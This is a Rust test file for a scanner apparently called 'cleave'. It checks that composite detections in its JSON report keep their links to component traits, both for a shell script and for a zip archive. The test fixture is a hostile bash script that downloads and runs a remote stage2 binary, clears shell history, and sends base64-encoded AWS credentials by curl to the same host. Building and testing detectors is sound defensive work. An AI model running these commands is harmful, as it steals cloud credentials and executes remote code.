//! Regression guard: the compact JSON (`--format json` — what scan uploads to
//! hopper) must carry each composite's edges to the traits it fired on.
//!
//! The trait graph is the whole shape of a detection: "shell spawn" plus
//! "outbound socket" is a different story from either alone, and which atomics a
//! composite consumed is knowable only inside cleave. Emitting a flat trait list
//! throws that away, leaving a visualization to guess the edges by re-reading
//! the trait definitions. `CompactTrait::uses` carries them as indices into the
//! same file's `traits[]`.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use cleave::{AnalysisOptions, analyze_file};

fn compact_of(path: &std::path::Path) -> anyhow::Result<cleave::types::CompactReport> {
    let mut report = analyze_file(path, &AnalysisOptions::default())?;
    report.finalize();
    Ok(cleave::types::compact_from_files(&report.files))
}

/// A shell script wielding several behaviours that composites are built to
/// combine — enough that at least one composite must fire on it.
const SCRIPT: &str = r#"#!/bin/bash
curl -fsSL http://198.51.100.23/stage2 -o /tmp/.cache
chmod +x /tmp/.cache
/tmp/.cache &
history -c
echo "$(cat ~/.aws/credentials)" | base64 | curl -X POST -d @- http://198.51.100.23/x
"#;

#[test]
fn compact_json_carries_composite_to_component_edges() -> anyhow::Result<()> {
    let dir = tempfile::tempdir()?;
    let path = dir.path().join("stage.sh");
    std::fs::write(&path, SCRIPT)?;

    let compact = compact_of(&path)?;

    let file = compact.files.first().expect("one analyzed file");
    assert!(!file.findings.is_empty(), "script must produce traits");

    for (i, t) in file.findings.iter().enumerate() {
        for &used in &t.uses {
            let used = used as usize;
            assert!(
                used < file.findings.len(),
                "{}: uses[{used}] is out of range for a {}-trait file",
                t.id,
                file.findings.len(),
            );
            assert_ne!(used, i, "{}: a composite must not reference itself", t.id);
        }
        assert!(
            t.uses.windows(2).all(|w| w[0] < w[1]),
            "{}: uses must be ascending and deduplicated, got {:?}",
            t.id,
            t.uses,
        );
    }

    let with_edges: Vec<&str> = file
        .findings
        .iter()
        .filter(|t| !t.uses.is_empty())
        .map(|t| t.id.as_str())
        .collect();
    assert!(
        !with_edges.is_empty(),
        "no composite carried component edges; traits: {:?}",
        file.findings.iter().map(|t| &t.id).collect::<Vec<_>>(),
    );

    // The edges must survive serialization — this is the field a consumer reads.
    let wire: serde_json::Value = serde_json::from_str(&serde_json::to_string(&compact)?)?;
    let uses = wire["files"][0]["traits"]
        .as_array()
        .expect("traits array")
        .iter()
        .filter_map(|t| t.get("uses"))
        .count();
    assert_eq!(
        uses,
        with_edges.len(),
        "every composite with edges must emit a `uses` key",
    );
    Ok(())
}

/// A container inherits both the composite and the components it fired on, so
/// the composite re-emitted on the archive indexes the *archive's* own
/// `traits[]` — it does not point across files. `uses` is the shape of the
/// detection, `from` is the member it happened in; a cross-file composite
/// carries both, and neither substitutes for the other.
#[test]
fn an_archive_resolves_its_members_composites_against_its_own_traits() -> anyhow::Result<()> {
    let dir = tempfile::tempdir()?;
    let zip_path = dir.path().join("stage.zip");
    {
        let mut zip = zip::ZipWriter::new(std::fs::File::create(&zip_path)?);
        zip.start_file("stage.sh", zip::write::SimpleFileOptions::default())?;
        std::io::Write::write_all(&mut zip, SCRIPT.as_bytes())?;
        zip.finish()?;
    }

    let compact = compact_of(&zip_path)?;
    let container = compact.files.first().expect("the archive itself");
    assert!(
        container.findings.iter().any(|t| !t.uses.is_empty()),
        "the archive must carry its member's composite edges",
    );

    let mut inherited_with_edges = 0usize;
    for t in &container.findings {
        for &used in &t.uses {
            assert!(
                (used as usize) < container.findings.len(),
                "{}: an inherited composite must index the container's own traits[]",
                t.id,
            );
        }
        if !t.uses.is_empty() && !t.from.is_empty() {
            inherited_with_edges += 1;
        }
    }
    assert!(
        inherited_with_edges > 0,
        "a composite inherited from a member must carry both `uses` and `from`",
    );
    Ok(())
}
